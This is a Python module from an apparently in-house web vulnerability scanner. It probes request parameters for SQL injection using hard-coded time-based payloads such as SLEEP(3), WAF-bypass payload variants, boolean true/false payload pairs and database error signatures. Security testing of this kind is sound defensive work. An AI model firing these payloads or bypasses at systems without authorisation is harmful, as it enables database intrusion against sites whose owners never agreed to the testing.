"""SQLi detection module for Titan Scanner."""

from __future__ import annotations

import time
from typing import Any, Dict, List, Optional

from titan.core.models import Finding, Severity, AttackType
from titan.verify import BaselineAnalyzer, BlindDetector
from titan.verify.oracles import is_echo_differential


class SQLiDetector:
    def __init__(self, payload_smith, fingerprint: Dict[str, Any]):
        self.payload_smith = payload_smith
        self.fingerprint = fingerprint
        self.blind_detector = BlindDetector(samples=3, confidence=0.95)

    async def scan(self, context, target: str, method: str, url: str, params: Dict[str, str]) -> List[Finding]:
        findings: List[Finding] = []

        context_data = {
            "fingerprint": self.fingerprint,
            "attack_type": "sqli",
            "param_type": "text",
            "location": "query" if method == "GET" else "body",
        }
        base_payloads = self.payload_smith.get_base_payloads("sqli", context_data)[:8]
        # Time-based payloads: many apps never leak SQL errors, timing is the only oracle.
        base_payloads = base_payloads + ["' AND SLEEP(3)--", "' OR SLEEP(3)--", "1' AND SLEEP(3)--"]
        waf = self.payload_smith.detect_waf({}, "", 0) or self.fingerprint.get("waf", "unknown")
        if waf and waf != "unknown":
            base_payloads.extend(self.payload_smith.get_waf_bypass_payloads(base_payloads[:3], waf)[:3])
        payloads = await self.payload_smith.mutate(base_payloads, context_data)
        all_payloads = list(dict.fromkeys(base_payloads + payloads))[:6]

        for param_name in list(params.keys())[:3]:
            finding = await self._test_param(context, target, method, url, param_name, params, all_payloads)
            if finding:
                findings.append(finding)

        return findings

    async def _test_param(self, context, target, method, url, param_name, all_params, payloads) -> Optional[Finding]:
        try:
            baseline_body = ""
            baseline_status = None
            baseline_times: List[float] = []

            try:
                for _ in range(3):
                    start = time.monotonic()
                    if method == "GET":
                        r = await context.request.get(url, params=all_params, headers={"Referer": target}, timeout=3000)
                    else:
                        r = await context.request.post(url, data=all_params, headers={"Referer": target}, timeout=3000)
                    baseline_times.append(time.monotonic() - start)
                    if not baseline_body:
                        baseline_body = await r.text()
                        baseline_status = r.status
            except Exception:
                pass

            # Timing-oracle budget: at most 2 runs per param. On a non-vulnerable
            # target, every sleep payload × 3 samples would burn the module
            # budget (and trip the engine's per-module timeout / 3-strike counter).
            timing_runs = 0

            for payload in payloads:
                try:
                    test_params = dict(all_params)
                    test_params[param_name] = payload
                    if method == "GET":
                        resp = await context.request.get(url, params=test_params, headers={"Referer": target}, timeout=3000)
                    else:
                        resp = await context.request.post(url, data=test_params, headers={"Referer": target}, timeout=3000)
                    body = await resp.text()

                    diffs = BaselineAnalyzer.diff_responses(baseline_body, body, payload)

                    # Timing oracle only pays for itself on delay-capable payloads;
                    # capped at `timing_runs < 2` so a clean target can't burn the
                    # module budget (see the cap above).
                    is_blind, blind_time = False, 0.0
                    if timing_runs < 2 and any(k in payload.lower() for k in ["sleep(", "sleep ", "benchmark(", "waitfor", "pg_sleep"]):
                        timing_runs += 1
                        is_blind, blind_time = await self.blind_detector.detect_time_based(
                            context, url, method, test_params, {}, {"Referer": target},
                            payload, "query", baseline_times, param_name=param_name
                        )
                    if is_blind:
                        diffs.append(f"time_delay:{blind_time:.1f}s")

                    error_signatures = [
                        "sql syntax", "mysql_fetch_array", "ora-", "postgresql",
                        "warning: mysql", "syntax error", "sqlstate", "odbc driver",
                        "unclosed quotation mark", "quoted string not properly terminated",
                    ]
                    for sig in error_signatures:
                        if sig in body.lower() and sig not in baseline_body.lower():
                            diffs.append(f"error:{sig}")
                            break

                    # Sanity-pair oracle: boolean-based confirmation.
                    # Echo guard: from the JSON structure perspective, if the
                    # ONLY differences between the payload and its opposite
                    # response are echoed strings (fields whose values contain
                    # the payload/opposite), no injection occurred.
                    sanity_confirmed = False
                    if "'" in payload.lower() or "or 1=1" in payload.lower():
                        opposite = self._get_opposite_payload(payload)
                        if opposite:
                            opp_params = dict(all_params)
                            opp_params[param_name] = opposite
                            if method == "GET":
                                opp_resp = await context.request.get(url, params=opp_params, headers={"Referer": target}, timeout=3000)
                            else:
                                opp_resp = await context.request.post(url, data=opp_params, headers={"Referer": target}, timeout=3000)
                            opp_body = await opp_resp.text()
                            if not is_echo_differential(body, opp_body, payload, opposite):
                                sanity_confirmed = True
                                diffs.append("sanity_pair:boolean_confirmed")

                    all_diffs = diffs

                    # Genuine SQL evidence: non-echo sanity differential, SQL
                    # error signature in body, or blind timing confirmation.
                    sql_evidence = sanity_confirmed or any(sig in body.lower() for sig in error_signatures) or is_blind

                    if sql_evidence and (all_diffs or resp.status >= 500):
                        severity = Severity.CRITICAL if (resp.status >= 500 or is_blind) else Severity.HIGH
                        confidence = min(0.99, 0.5 + len(all_diffs) * 0.1)
                        if "sanity_pair:boolean_confirmed" in all_diffs:
                            confidence = max(confidence, 0.85)
                        has_real_evidence = "sanity_pair:boolean_confirmed" in all_diffs or any(sig in body.lower() for sig in error_signatures) or is_blind
                        return Finding(
                            target=target,
                            url=str(resp.url or url),
                            method=method.upper(),
                            param=param_name,
                            location="query" if method == "GET" else "body",
                            payload=payload,
                            attack_type=AttackType.SQLI,
                            severity=severity,
                            verified=has_real_evidence,
                            confidence=confidence,
                            status=resp.status,
                            headers=dict(resp.headers),
                            body=body[:2000],
                            diffs=all_diffs,
                            baseline_body=baseline_body[:2000],
                            baseline_status=baseline_status,
                            verification_body=body[:2000],
                            verification_status=resp.status,
                        )
                except Exception:
                    continue
            return None
        except Exception:
            return None

    def _get_opposite_payload(self, payload: str) -> Optional[str]:
        """Generate the logical opposite for sanity-pair testing."""
        pl = payload.lower()
        if "or 1=1" in pl:
            return payload.replace("OR 1=1", "AND 1=2").replace("or 1=1", "AND 1=2")
        if "or '1'='1" in pl:
            return payload.replace("OR '1'='1", "AND '1'='2").replace("or '1'='1", "AND '1'='2")
        if "union select" in pl:
            return payload.replace("UNION SELECT", "AND 1=2--").replace("union select", "AND 1=2--")
        return None


